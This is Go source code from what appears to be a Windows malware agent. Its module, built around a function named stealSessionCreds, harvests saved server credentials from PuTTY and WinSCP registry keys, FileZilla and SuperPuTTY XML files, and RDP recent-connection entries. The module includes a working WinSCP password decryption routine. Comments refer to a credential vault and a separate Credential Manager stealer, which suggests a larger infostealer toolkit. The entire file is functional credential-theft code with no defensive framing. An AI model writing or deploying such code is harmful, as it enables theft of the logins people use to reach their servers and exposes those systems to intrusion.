//go:build windows

package agent

import (
	"encoding/base64"
	"encoding/xml"
	"fmt"
	"os"
	"path/filepath"
	"strings"

	"golang.org/x/sys/windows/registry"
)

// SessionCred reuses BrowserCred so the vault auto-import already works.

// stealSessionCreds aggregates credentials from PuTTY, WinSCP, FileZilla,
// SuperPuTTY, and RDP MRU on the current user's profile.
func stealSessionCreds() ([]BrowserCred, error) {
	var all []BrowserCred
	all = append(all, puttysessions()...)
	all = append(all, winscpSessions()...)
	all = append(all, filezillaCreds()...)
	all = append(all, superPuttySessions()...)
	all = append(all, rdpMRU()...)
	if len(all) == 0 {
		return nil, fmt.Errorf("no session credentials found (PuTTY/WinSCP/FileZilla/RDP not installed or no saved sessions)")
	}
	return all, nil
}

// ── PuTTY ─────────────────────────────────────────────────────────────────────

func puttykeys() []string {
	return []string{
		`Software\SimonTatham\PuTTY\Sessions`,
		`Software\SimonTatham\PuTTY\Sessions`, // HKCU only
	}
}

func puttysessions() []BrowserCred {
	k, err := registry.OpenKey(registry.CURRENT_USER,
		`Software\SimonTatham\PuTTY\Sessions`, registry.ENUMERATE_SUB_KEYS)
	if err != nil {
		return nil
	}
	defer k.Close()
	names, _ := k.ReadSubKeyNames(-1)
	var creds []BrowserCred
	for _, name := range names {
		sk, err := registry.OpenKey(k, name, registry.QUERY_VALUE)
		if err != nil {
			continue
		}
		host, _, _ := sk.GetStringValue("HostName")
		user, _, _ := sk.GetStringValue("UserName")
		proto, _, _ := sk.GetStringValue("Protocol")
		sk.Close()
		if host == "" {
			continue
		}
		if proto == "" {
			proto = "ssh"
		}
		creds = append(creds, BrowserCred{
			Source:   "PuTTY",
			Target:   proto + "://" + host,
			Username: user,
			Password: "", // PuTTY stores keys, not passwords
		})
	}
	return creds
}

// ── WinSCP ────────────────────────────────────────────────────────────────────

func winscpSessions() []BrowserCred {
	k, err := registry.OpenKey(registry.CURRENT_USER,
		`Software\Martin Prikryl\WinSCP 2\Sessions`, registry.ENUMERATE_SUB_KEYS)
	if err != nil {
		return nil
	}
	defer k.Close()
	names, _ := k.ReadSubKeyNames(-1)
	var creds []BrowserCred
	for _, name := range names {
		sk, err := registry.OpenKey(k, name, registry.QUERY_VALUE)
		if err != nil {
			continue
		}
		host, _, _ := sk.GetStringValue("HostName")
		user, _, _ := sk.GetStringValue("UserName")
		encPw, _, _ := sk.GetStringValue("Password")
		sk.Close()
		if host == "" {
			continue
		}
		pw := ""
		if encPw != "" {
			if dec, err := winscpDecrypt(encPw, user, host); err == nil {
				pw = dec
			} else {
				pw = "[encrypted — no master password set]"
			}
		}
		creds = append(creds, BrowserCred{
			Source:   "WinSCP",
			Target:   host,
			Username: user,
			Password: pw,
		})
	}
	return creds
}

// winscpDecrypt decrypts a WinSCP 2 password stored in the registry.
// WinSCP uses XOR obfuscation with a rotating key derived from 0xA3.
// Prefix username+hostname is stripped from the plaintext.
func winscpDecrypt(enc, username, hostname string) (string, error) {
	// Convert each char pair to nibbles
	enc = strings.ToUpper(enc)
	nibbles := make([]byte, 0, len(enc))
	for _, c := range enc {
		switch {
		case c >= '0' && c <= '9':
			nibbles = append(nibbles, byte(c-'0'))
		case c >= 'A' && c <= 'F':
			nibbles = append(nibbles, byte(c-'A'+10))
		}
	}

	key := byte(0xA3)
	next := func() (byte, bool) {
		if len(nibbles) < 2 {
			return 0, false
		}
		b := ((nibbles[0] << 4) | nibbles[1]) ^ key
		key = ^key
		nibbles = nibbles[2:]
		return b, true
	}

	flag, ok := next()
	if !ok {
		return "", fmt.Errorf("too short")
	}
	var length byte
	if flag == 0xFF {
		if _, ok = next(); !ok {
			return "", fmt.Errorf("too short")
		}
		if length, ok = next(); !ok {
			return "", fmt.Errorf("too short")
		}
	} else {
		length = flag
	}
	buf := make([]byte, length)
	for i := range buf {
		if buf[i], ok = next(); !ok {
			return "", fmt.Errorf("truncated at %d", i)
		}
	}

	// Strip username+hostname prefix that WinSCP prepends before the actual password
	s := string(buf)
	prefix := username + hostname
	if strings.HasPrefix(s, prefix) {
		s = s[len(prefix):]
	}
	return s, nil
}

// ── FileZilla ─────────────────────────────────────────────────────────────────

type fzServer struct {
	Host  string `xml:"Host"`
	Port  string `xml:"Port"`
	User  string `xml:"User"`
	Pass  struct {
		Value   string `xml:",chardata"`
		Encoded string `xml:"encoding,attr"`
	} `xml:"Pass"`
}

type fzRoot struct {
	Servers []fzServer `xml:"Server"`
	Entries []struct {
		Servers []fzServer `xml:"Server"`
	} `xml:"Bookmarks>Bookmark"`
}

func filezillaCreds() []BrowserCred {
	appData := os.Getenv("APPDATA")
	if appData == "" {
		return nil
	}
	var all []BrowserCred
	for _, name := range []string{"recentservers.xml", "sitemanager.xml"} {
		path := filepath.Join(appData, "FileZilla", name)
		creds, _ := parseFileZillaXML(path)
		all = append(all, creds...)
	}
	return all
}

func parseFileZillaXML(path string) ([]BrowserCred, error) {
	data, err := os.ReadFile(path)
	if err != nil {
		return nil, err
	}
	var root fzRoot
	if err := xml.Unmarshal(data, &root); err != nil {
		return nil, err
	}
	servers := root.Servers
	for _, bk := range root.Entries {
		servers = append(servers, bk.Servers...)
	}
	var creds []BrowserCred
	for _, s := range servers {
		if s.Host == "" {
			continue
		}
		pw := s.Pass.Value
		if strings.EqualFold(s.Pass.Encoded, "base64") {
			if dec, err := base64.StdEncoding.DecodeString(pw); err == nil {
				pw = string(dec)
			}
		}
		creds = append(creds, BrowserCred{
			Source:   "FileZilla",
			Target:   s.Host,
			Username: s.User,
			Password: pw,
		})
	}
	return creds, nil
}

// ── SuperPuTTY ────────────────────────────────────────────────────────────────

type spSession struct {
	Host     string `xml:"Host,attr"`
	Port     string `xml:"Port,attr"`
	Username string `xml:"Username,attr"`
	Password string `xml:"Password,attr"`
}

func superPuttySessions() []BrowserCred {
	appData := os.Getenv("APPDATA")
	if appData == "" {
		return nil
	}
	path := filepath.Join(appData, "SuperPuTTY", "Sessions.xml")
	data, err := os.ReadFile(path)
	if err != nil {
		return nil
	}
	var root struct {
		Sessions []spSession `xml:"SessionData"`
	}
	if err := xml.Unmarshal(data, &root); err != nil {
		return nil
	}
	var creds []BrowserCred
	for _, s := range root.Sessions {
		if s.Host == "" {
			continue
		}
		creds = append(creds, BrowserCred{
			Source:   "SuperPuTTY",
			Target:   s.Host,
			Username: s.Username,
			Password: s.Password,
		})
	}
	return creds
}

// ── RDP MRU ──────────────────────────────────────────────────────────────────

func rdpMRU() []BrowserCred {
	k, err := registry.OpenKey(registry.CURRENT_USER,
		`Software\Microsoft\Terminal Server Client\Servers`, registry.ENUMERATE_SUB_KEYS)
	if err != nil {
		return nil
	}
	defer k.Close()
	names, _ := k.ReadSubKeyNames(-1)
	var creds []BrowserCred
	for _, host := range names {
		sk, err := registry.OpenKey(k, host, registry.QUERY_VALUE)
		if err != nil {
			continue
		}
		user, _, _ := sk.GetStringValue("UsernameHint")
		sk.Close()
		creds = append(creds, BrowserCred{
			Source:   "RDP",
			Target:   host + ":3389",
			Username: user,
			Password: "", // stored in CredManager (already captured by stealCredManager)
		})
	}
	return creds
}
